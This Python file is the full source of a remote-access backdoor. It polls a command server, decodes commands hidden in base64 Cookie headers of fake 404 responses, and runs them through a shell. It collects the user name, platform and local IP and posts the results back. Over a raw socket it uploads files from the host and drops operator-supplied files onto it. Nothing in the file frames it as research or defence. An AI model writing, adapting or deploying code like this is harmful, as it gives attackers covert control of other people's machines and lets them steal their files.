from subprocess import Popen,PIPE
from socket import socket,AF_INET,SOCK_DGRAM
from getpass import getuser
from platform import platform
from time import sleep
from requests import post
from json import dumps,loads
from base64 import b64encode,b64decode
from os.path import basename,getsize,exists,isfile
key = ''
IP = "127.0.0.1"
PORT = 9000
class BaseFunc:
    def __init__(self) -> None:
        self.localuser = getuser()
        self.sys_info = platform()
        self.key_url = "http://"+IP+":"+str(PORT)+"/getkeys"
        self.pay_url = "http://"+IP+":"+str(PORT)+"/getpayloads"
        self.ret_url = "http://"+IP+":"+str(PORT)+"/addrst"

    def getbaseinfo(self) -> dict:
        try:
            s = socket(AF_INET,SOCK_DGRAM)
            s.connect(('baidu.com',0))
            local_ip = s.getsockname()[0]
            rst = {"localuser":self.localuser,"sys_info":self.sys_info,"local_ip":local_ip}
        except:
            rst = {"localuser":self.localuser,"sys_info":self.sys_info,"local_ip":None}
        finally:
            return rst

    def getkeys(self) -> str:
        rst = post(url=self.key_url,timeout=5)
        if rst.status_code == 404 and rst.headers.get("Cookie"):
            rst = loads(b64decode(rst.headers.get("Cookie")).decode("utf-8"))
            return rst.get("key")
        else:
            return "error"
    
    def getpay(self,key:str):
        head = {"Cookie":"cid="+key}
        rst = post(url=self.pay_url,headers=head,timeout=5)
        if rst.status_code == 404 and rst.headers.get("Cookie"):
            rst = loads(b64decode(rst.headers.get("Cookie")).decode("utf-8"))
            return rst.get("data")
        if rst.status_code == 500:
            return "exit"
        else:
            return ""

    def exc(self,cdm:str):
        rst = self.getbaseinfo()
        if isinstance(cdm,str) and cdm != '':
            if cdm == "getlive":
                rst['cdm'] = "getlive"
                rst['data'] = ''
            else:
                r = Popen(cdm,shell=True,stderr=PIPE,stdout=PIPE)
                r = r.stdout.read()
                if r:
                    pass
                else:
                    r = "命令执行失败！".encode("utf-8")
                rst['cdm'] = cdm
                rst['data'] = str(b64encode(r))
            return rst
        else:
            return None
    def downfile(self):
        s = socket()
        s.connect((IP,60000))
        s.send("t".encode("utf-8"))
        filename = ''
        filesize = ''
        filewritedir = ''
        data = s.recv(1024)
        if data:
            try:
                data = data.decode("utf-8")
            except:
                pass
            else:
                data = data.split("'")[1]
                data = loads(b64decode(data).decode("utf-8"))
                filename = data.get("filename")
                filesize = data.get("filesize")
                filewritedir = data.get("filewritedir")
                if exists(filewritedir) and not isfile(filewritedir):
                    pass
                else:
                    filewritedir = "/tmp/"
                with open(filewritedir+filename,"wb") as fp:
                        if isinstance(data,str):
                            data = data.encode("utf-8")
                            filesize -= len(data)
                            fp.write(data)
                        while filesize >0:
                            data = s.recv(1024)
                            if data:
                                filesize -= len(data)
                                fp.write(data)
                                if filesize == 0:
                                    fp.flush()
                                    s.send(dumps({"whoami":"t","data":"exit"}).encode("utf-8"))
        s.send(dumps({"whoami":"exit"}).encode("utf-8"))
        s.close()

    def uploadfile(self,filepath,targetfilepath=''):
        s = socket()
        s.connect((IP,60000))
        s.send("c".encode("utf-8"))
        switch = True
        if exists(filepath) and isfile(filepath):
            filename = basename(filepath)
            filesize = getsize(filepath)
        else:
            filename = "nofile"
            filesize = -1
        while True:
            data = s.recv(1024)
            if data:
                isok = loads(data.decode("utf-8"))
                break
        if isinstance(isok,dict) and isok.get("info") == "yes":
            while switch:
                filehead = {"filename":filename,"filesize":filesize,"filewritedir":targetfilepath}
                data = {"whoami":"c","data":str(b64encode(dumps(filehead).encode("utf-8")))}
                if data.get("data") == "exit":
                    s.send(dumps(data).encode("utf-8"))
                    break
                s.send(dumps(data).encode("utf-8"))
                if filename == "nofile" and filesize == -1:
                    break
                sleep(1)
                data = {"whoami":"c","data":"senddata"}
                s.send(dumps(data).encode("utf-8"))
                with open(filepath,"rb") as fp:
                    while filesize >0:
                        content = fp.read(1024)
                        filesize -= len(content)
                        s.sendall(content)
                        if filesize == 0:
                            switch = False
                            break        
        s.close()

def main():
    base = BaseFunc()
    key = base.getkeys()
    time = 10
    while True:
        if key:
            try:
                rst = base.getpay(key)
                if rst == "exit":
                    break
                if isinstance(rst,dict) and isinstance(rst.get("cdm"),str):
                    if rst.get("sleeptime"):
                        time = float(rst.get("sleeptime"))
                        if time < 0:
                            time = 10
                    c = rst.get("cdm")
                    if c == "exit_yes":
                        break
                    elif c == "uploadfile":
                        base.downfile()
                        rst = "执行完毕！"
                    elif c.split(' ')[0].strip() == "downfile":
                        base.uploadfile(c.split(' ')[1].strip())
                        rst = "执行完毕！"
                    else:
                        rst = base.exc(c)
                    if isinstance(rst,dict):
                        head = {"Cookie":"cid="+key}
                        data = {"data":str(b64encode(dumps(rst).encode("utf-8")))}
                        rst = post(url=base.ret_url,headers=head,data=data,timeout=5)
            except:
                pass
            sleep(time)
        else:
            break

if __name__ == "__main__":
    main()




